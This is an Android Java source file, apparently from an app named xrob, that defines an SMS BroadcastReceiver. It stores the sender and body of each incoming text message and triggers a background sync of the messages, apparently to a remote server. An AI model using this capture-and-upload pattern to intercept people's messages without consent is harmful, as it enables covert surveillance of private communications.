package com.theah64.xrob.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.theah64.xrob.asynctasks.MessagesSynchronizer;
import com.theah64.xrob.database.Messages;
import com.theah64.xrob.models.Message;
import com.theah64.xrob.utils.APIRequestGateway;

public class SMSReceiver extends BroadcastReceiver {

    private static final String X = SMSReceiver.class.getSimpleName();
    private static final String KEY_PDUS = "pdus";

    public SMSReceiver() {
    }

    @Override
    public void onReceive(final Context context, Intent intent) {
        Log.i(X, "SMS Received...");

        final Bundle dataBundle = intent.getExtras();

        if (dataBundle != null) {

            final Object[] pdus = (Object[]) dataBundle.get(KEY_PDUS);

            //Looping through  each pdus
            assert pdus != null;
            for (Object pdu : pdus) {

                final SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                final boolean isAdded = Messages.getInstance(context).add(new Message("0", sms.getOriginatingAddress(), sms.getDisplayMessageBody(), Message.TYPE_INBOX, System.currentTimeMillis())) != 1;
                if (isAdded) {
                    Log.e(X, "Message added to DB...");
                    new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
                        @Override
                        public void onReadyToRequest(String apiKey) {
                            new MessagesSynchronizer(context, apiKey).execute();
                        }

                        @Override
                        public void onFailed(String reason) {
                            Log.e(X, "Reason : " + reason);
                        }
                    });
                }
            }
        }
    }
}
